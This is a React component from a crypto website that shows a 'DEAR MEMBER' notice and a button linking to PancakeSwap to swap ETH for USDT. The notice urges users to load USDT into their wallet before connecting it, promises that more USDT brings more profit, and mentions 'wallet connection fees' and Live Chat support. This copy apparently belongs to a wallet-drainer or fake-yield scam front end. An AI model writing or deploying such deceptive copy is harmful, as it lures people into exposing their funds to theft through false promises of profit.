

const Swap = () => {


return (
        <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
            <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
                <div className="text-center">
                    <span className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                        IMPORTANT
                    </span>
                    <div className="text-green-400 text-md font-semibold mt-2 p-2 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700">
                        DEAR MEMBER:
                    </div>
                    {/*space*/}
                    <div className="mt-4 space-y-3">
                    </div>
                    <div className="flex justify-between p-3 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700">
                        <span className="text-gray-300 text-left">
                        <br />
                        - Before connect your wallet, make sure you have USDT balance in your wallet.
                        <br />
                        - The more USDT you have, the more profit you will get.
                        <br />
                        - If you don't have USDT in your wallet, you can exchange your ETH to USDT via the button below.
                        <br />
                        - After exchanging ETH to USDT make sure to connect the wallet via the button available in the wallet section.
                        <br />
                        - Make sure you leave an small ETH balance for the wallet connection fees,
                        <br />
                        - If you have any questions, please contact our support team in Live Chat.
                        <br />
                        <br />
                        </span>
                    </div>
                </div>
            </div>
            <div className="mt-6">
                <div className="flex justify-center">
                    <a href="https://pancakeswap.finance/?chain=eth&outputCurrency=0xdAC17F958D2ee523a2206206994597C13D831ec7" target="_blank" rel="noopener noreferrer">
                        <button className="bg-gradient-to-r from-blue-400 to-purple-400 text-white text-lg font-semibold px-6 py-3 rounded-lg shadow-lg hover:from-purple-400 hover:to-blue-400 transition-colors duration-300">
                            Exchange ETH to USDT
                        </button>
                    </a>
                </div>    
            </div>
        </section>
    );
};

export default Swap;

